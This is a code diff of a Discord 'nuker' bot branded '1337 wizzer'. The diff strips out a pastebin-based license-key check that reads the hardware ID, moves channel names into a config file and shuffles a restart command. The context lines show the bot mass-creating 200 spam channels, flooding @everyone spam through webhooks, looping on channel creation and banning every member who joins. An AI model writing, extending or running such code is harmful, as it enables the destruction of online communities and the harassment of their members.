@@ -1,44 +1,13 @@
-# Simple Authentication System
-
-import requests, time, os, ctypes, subprocess
-from colorama import Fore as F
-
-os.system('cls')
-
-hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
-system_name = os.getenv('HOSTNAME')
-user_name = os.getenv('USERNAME')
-
-ctypes.windll.kernel32.SetConsoleTitleW("1337 Auth | " + hwid)
-key1 = input(f"Please enter your key: {F.CYAN}")
-r = requests.get("https://pastebin.com/bmyhaeYj")
-if key1 in r.text:
-    print(f"{F.GREEN}Access granted. Welcome to 1337 Nuker!{F.RESET}")
-    ctypes.windll.kernel32.SetConsoleTitleW(f"Welcome to 1337 official nuker! Logged in as {user_name}")
-    time.sleep(2)
-    os.system('cls')
-elif key1 == "Please enter your key: ":
-    print(f"{F.RED}Invalid Key! Fuck off dweeb.{F.RESET}")
-    print(f"Please contact {F.BLUE}𝖃𝖒𝖆𝖘 $𝖆𝖎𝖛#1337{F.RESET} to get a key.")
-    time.sleep(5)
-    quit()
-else:
-    print(f"{F.RED}Invalid Key! Fuck off dweeb.{F.RESET}")
-    print(f"Please contact {F.BLUE}𝖃𝖒𝖆𝖘 $𝖆𝖎𝖛#1337{F.RESET} to get a key.")
-    time.sleep(5)
-    quit()
-
 # Bot Start Point
 
 dm_msg = "**1337 Beamed You** https://youtu.be/gGzOhy9vNkg"
 spam_messages = ["@everyone **1337 wizzed this** <a:__:770078001315446816>\nhttps://youtu.be/gGzOhy9vNkg", "@everyone **Wizzed by 1337 | We are in the shadows**"]
-channel_names = ["🤫", "1337", "beamed"]
 webhook_usernames = ["1337 Wizzed U", "1337", "1337 BEAMER", "🤫"]
 
 import discord, random, aiohttp, asyncio, json, os, threading
 from discord import Webhook, AsyncWebhookAdapter
 from discord.ext import commands
-from colorama import Fore as C, Style as S
+from colorama import Fore as C
 from time import sleep
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
@@ -48,6 +17,7 @@ with open('config.json') as f:
     BOT_PREFIX = conf.get('BOT_PREFIX')
     NUKE_ON_JOIN = conf.get('NUKE_ON_JOIN')
     NUKE_WAIT_TIME = conf.get('NUKE_WAIT_TIME')
+    CHANNEL_NAMES = conf.get('CHANNEL_NAMES')
 
 bot = commands.Bot(command_prefix = BOT_PREFIX, case_insensitive=True, intents=discord.Intents.all())
 bot.remove_command("help")
@@ -84,7 +54,7 @@ async def nuke(guild):
   webhook.add_embed(log)
   webhook.execute()
   for i in range(200):
-    await guild.create_text_channel(random.choice(channel_names))
+    await guild.create_text_channel(random.choice(CHANNEL_NAMES))
   print(f"{C.GREEN}Nuked {guild.name} ~ Using 1337 wizzer.")
 
 
@@ -207,6 +177,16 @@ async def roles(ctx):
         guild = ctx.guild
         await guild.create_role(name="1337")
 
+@bot.command()
+async def force_restart(ctx):
+  if ctx.channel.id == ctx.author.dm_channel.id:
+    await ctx.message.delete()
+    await ctx.author.send("**Restarting...**")
+    sleep(0.5)
+    os._exit(0)
+  else:
+    return
+
 @bot.event
 async def on_guild_channel_create(channel):
   while True:
@@ -232,6 +212,10 @@ async def on_member_join(member):
    await member.ban(reason="Not stealing 1337's wizz, clown")
  else:
    await member.ban(reason="1337 wizzed this")
+
+@bot.event
+async def on_command_error(error):
+  await print(C.RED + "[-] [ERROR] " + error + C.RESET)
 
 def _input():
         sleep(5)
@@ -266,16 +250,6 @@ def _input():
             if inp == "restart":
                 os.system("start cmd /c py main.py")
                 os._exit(0)
-
-@bot.command()
-async def force_restart(ctx):
-  if ctx.channel.id == ctx.author.dm_channel.id:
-    await ctx.message.delete()
-    await ctx.author.send("**Restarting...**")
-    sleep(0.5)
-    os._exit(0)
-  else:
-    return
 
 try:
   thread = threading.Thread(target=_input)
